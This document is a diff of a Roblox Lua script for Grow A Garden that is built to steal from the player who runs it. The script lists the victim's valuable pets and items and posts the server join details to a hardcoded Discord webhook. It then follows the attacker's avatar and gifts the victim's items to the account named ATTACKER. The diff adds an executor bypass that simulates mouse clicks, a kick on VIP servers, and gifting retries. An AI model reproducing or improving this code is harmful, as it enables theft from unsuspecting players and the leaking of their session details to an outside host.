@@ -1,48 +1,96 @@
+-- Check if script is already injected to avoid running multiple instances
 if shared.GAGInjected then return end
 shared.GAGInjected = true
 
+-- Define constants for attacker username and Discord webhook
 local ATTACKER = "USERNAME_HERE"
 local WEBHOOK = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
-local IMPORTANT = {"Raccoon","Dragonfly","Red Fox","Queen Bee","Chicken Zombie","Candy Blossom","Kitsune","French Fly Ferret"}
-local IGNORED = {"Can","Shovel","Seed","Wrench","Sprinkler","Rod","Tool","Staff","Trowel"}
+local IMPORTANT = {"Raccoon", "Dragonfly", "Red Fox", "Queen Bee", "Chicken Zombie", "Candy Blossom", "Kitsune", "French Fly Ferret"}
+local IGNORED = {"Can", "Shovel", "Seed", "Wrench", "Sprinkler", "Rod", "Tool", "Staff", "Trowel"}
 
--- Проверка LocalPlayer
+-- Wait for the local player to be available before proceeding
 if not game.Players.LocalPlayer then
     game.Players.PlayerAdded:Wait()
 end
-
 local localPlayer = game.Players.LocalPlayer
 if not localPlayer then return end
 
-for _,pet in pairs(workspace.PetsPhysical:GetChildren()) do
-    if pet:GetAttribute("OWNER") == localPlayer.Name then
-        for _,v in pairs(pet:GetChildren()) do
-            if v:IsA("Tool") then
-                local replicatedStorage = game:GetService("ReplicatedStorage")
-                if replicatedStorage and replicatedStorage:FindFirstChild("GameEvents") and replicatedStorage.GameEvents:FindFirstChild("PetsService") then
-                    replicatedStorage.GameEvents.PetsService:FireServer("UnequipPet", v.Name)
+-- Get essential services and verify they exist
+local function checkService(serviceName)
+    -- Ensure the service is accessible to avoid errors
+    local success, result = pcall(function() return game:GetService(serviceName) end)
+    return success and result or nil
+end
+
+local ReplicatedStorage = checkService("ReplicatedStorage")
+local Players = checkService("Players")
+local HttpService = checkService("HttpService")
+local VirtualInputManager = checkService("VirtualInputManager")
+if not (ReplicatedStorage and Players and HttpService and VirtualInputManager) then
+    warn("Some required game services couldn't be found.")
+    return
+end
+
+-- Delta executor bypass using provided function
+local function deltaBypass()
+    -- Simulate a mouse click at the center of the screen
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0,      
+        true,   
+        nil,    
+        false   
+    )
+    task.wait()
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0,
+        false,
+        nil,
+        false
+    )
+end
+
+-- Check if this is a VIP server and kick if true
+local GetServerType = ReplicatedStorage:WaitForChild("GetServerType")
+if GetServerType and GetServerType:InvokeServer() == "VIPServer" then
+    game.Players.LocalPlayer:Kick("Server type not supported.")
+    return
+end
+
+-- Unequip all pets owned by the local player
+if workspace:FindFirstChild("PetsPhysical") then
+    for _, pet in pairs(workspace.PetsPhysical:GetChildren()) do
+        if pet:GetAttribute("OWNER") == localPlayer.Name then
+            for _, v in pairs(pet:GetChildren()) do
+                if v:IsA("Tool") then
+                    local gameEvents = ReplicatedStorage:FindFirstChild("GameEvents")
+                    if gameEvents and gameEvents:FindFirstChild("PetsService") then
+                        gameEvents.PetsService:FireServer("UnequipPet", v.Name)
+                    end
                 end
             end
         end
     end
 end
 
-for _,tool in pairs(localPlayer.Backpack:GetChildren()) do
+-- Mark favorite tools in the backpack
+for _, tool in pairs(localPlayer.Backpack:GetChildren()) do
     if tool:IsA("Tool") and tool:GetAttribute("d") == true then
-        local replicatedStorage = game:GetService("ReplicatedStorage")
-        if replicatedStorage and replicatedStorage:FindFirstChild("GameEvents") and replicatedStorage.GameEvents:FindFirstChild("Favorite_Item") then
-            replicatedStorage.GameEvents.Favorite_Item:FireServer(tool)
+        local gameEvents = ReplicatedStorage:FindFirstChild("GameEvents")
+        if gameEvents and gameEvents:FindFirstChild("Favorite_Item") then
+            gameEvents.Favorite_Item:FireServer(tool)
         end
     end
 end
 
+-- Collect items and categorize them
 local items = {}
 local importantItems = {}
-
-for _,item in pairs(localPlayer.Backpack:GetChildren()) do
+for _, item in pairs(localPlayer.Backpack:GetChildren()) do
     if item:IsA("Tool") then
         local isImportant = false
-        for _,v in ipairs(IMPORTANT) do
+        for _, v in ipairs(IMPORTANT) do
             if string.find(string.lower(item.Name), string.lower(v)) then
                 table.insert(importantItems, item.Name)
                 isImportant = true
@@ -51,7 +99,7 @@ for _,item in pairs(localPlayer.Backpack:GetChildren()) do
         end
         if not isImportant then
             local shouldIgnore = false
-            for _,v in ipairs(IGNORED) do
+            for _, v in ipairs(IGNORED) do
                 if string.find(string.lower(item.Name), string.lower(v)) then
                     shouldIgnore = true
                     break
@@ -64,14 +112,16 @@ for _,item in pairs(localPlayer.Backpack:GetChildren()) do
     end
 end
 
+-- Prepare data for Discord notification
 local ping = #importantItems > 0 and "@everyone " or ""
 local placeId = game.PlaceId
 local jobId = game.JobId
 local teleportCode = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
 local consoleCode = string.format('Roblox.GameLauncher.joinGameInstance(%s, "%s")', placeId, jobId)
-local joinLink = string.format("roblox://placeID=%s&gameInstanceID=%s", placeId, jobId)
+local joinLink = string.format("roblox://placeID=%s&gameInstanceId=%s", placeId, jobId)
 
-local request = syn and syn.request or http_request or request
+-- Send notification to Discord if possible
+local request = http_request or (syn and syn.request) or (fluxus and fluxus.request)
 if request then
     pcall(function()
         request({
@@ -80,8 +130,8 @@ if request then
             Headers = {
                 ["Content-Type"] = "application/json"
             },
-            Body = game:GetService("HttpService"):JSONEncode({
-                ["content"] = ping..teleportCode,
+            Body = HttpService:JSONEncode({
+                ["content"] = ping .. teleportCode,
                 ["embeds"] = {{
                     ["title"] = "Join to get Grow A Garden hit",
                     ["color"] = 65280,
@@ -100,44 +150,102 @@ if request then
     end)
 end
 
-while task.wait(0.5) do
-    local target = game.Players:FindFirstChild(ATTACKER)
-    if target and target.Character then
-        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            localPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
+-- Function to safely follow the target player
+local RunService = checkService("RunService")
+local function safeFollow(target)
+    local offset = CFrame.new(0, 0, 3)
+    local conn = RunService.Stepped:Connect(function()
+        if target.Character and localPlayer.Character then
+            local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
+            local followerRoot = localPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if targetRoot and followerRoot then
+                followerRoot.CFrame = targetRoot.CFrame * offset
+            end
         end
-        
-        for _,item in pairs(localPlayer.Backpack:GetChildren()) do
-            if item:IsA("Tool") then
-                local isImportant = false
-                for _,v in ipairs(IMPORTANT) do
-                    if string.find(string.lower(item.Name), string.lower(v)) then
-                        isImportant = true
-                        break
-                    end
+    end)
+    return {
+        Stop = function()
+            if conn then conn:Disconnect() end
+        end
+    }
+end
+
+-- Function to safely gift a tool with Delta bypass
+local function safeGiftTool(tool, target)
+    if not target or not target.Character or not localPlayer.Character then return false end
+    if tool.Parent ~= localPlayer.Backpack then
+        tool.Parent = localPlayer.Backpack
+        task.wait(0.3)
+    end
+
+    local humanoid = localPlayer.Character:FindFirstChild("Humanoid")
+    if not humanoid then return false end
+
+    humanoid:EquipTool(tool)
+    task.wait(0.6)
+
+    if tool.Parent ~= localPlayer.Character then
+        tool.Parent = localPlayer.Backpack
+        return false
+    end
+
+    if detectExecutor and detectExecutor() == "Delta" then
+        -- Use the provided Delta bypass function
+        deltaBypass()
+        task.wait(0.15)
+        if tool.Parent == localPlayer.Character then
+            tool.Parent = localPlayer.Backpack
+        end
+        return true
+    else
+        -- Fallback for other executors using FireServer
+        local gameEvents = ReplicatedStorage:FindFirstChild("GameEvents")
+        if gameEvents and gameEvents:FindFirstChild("PetGiftingService") then
+            local success, err = pcall(function()
+                gameEvents.PetGiftingService:FireServer("GivePet", target)
+                task.wait(0.5)
+                if tool.Parent == localPlayer.Character then
+                    tool.Parent = localPlayer.Backpack
                 end
-                
-                local shouldIgnore = false
-                for _,v in ipairs(IGNORED) do
-                    if string.find(string.lower(item.Name), string.lower(v)) then
-                        shouldIgnore = true
-                        break
-                    end
+                return true
+            end)
+            return success
+        end
+    end
+    return false
+end
+
+-- Execute the main logic
+local target = Players:FindFirstChild(ATTACKER)
+if target then
+    local follow = safeFollow(target)
+    task.wait(1)
+
+    for _, item in pairs(localPlayer.Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local isImportant = false
+            for _, v in ipairs(IMPORTANT) do
+                if string.find(string.lower(item.Name), string.lower(v)) then
+                    isImportant = true
+                    break
                 end
-                
-                if not shouldIgnore then
-                    item.Parent = localPlayer.Character
-                    task.wait(0.2)
-                    local replicatedStorage = game:GetService("ReplicatedStorage")
-                    if replicatedStorage and replicatedStorage:FindFirstChild("GameEvents") and replicatedStorage.GameEvents:FindFirstChild("PetGiftingService") then
-                        replicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", target)
-                    end
-                    task.wait(0.2)
-                    if item.Parent == localPlayer.Character then
-                        item.Parent = localPlayer.Backpack
-                    end
+            end
+
+            local shouldIgnore = false
+            for _, v in ipairs(IGNORED) do
+                if string.find(string.lower(item.Name), string.lower(v)) then
+                    shouldIgnore = true
+                    break
+                end
+            end
+
+            if not shouldIgnore then
+                for attempt = 1, 3 do
+                    if safeGiftTool(item, target) then break end
+                    task.wait(0.5)
                 end
             end
         end
     end
+    follow.Stop()
 end
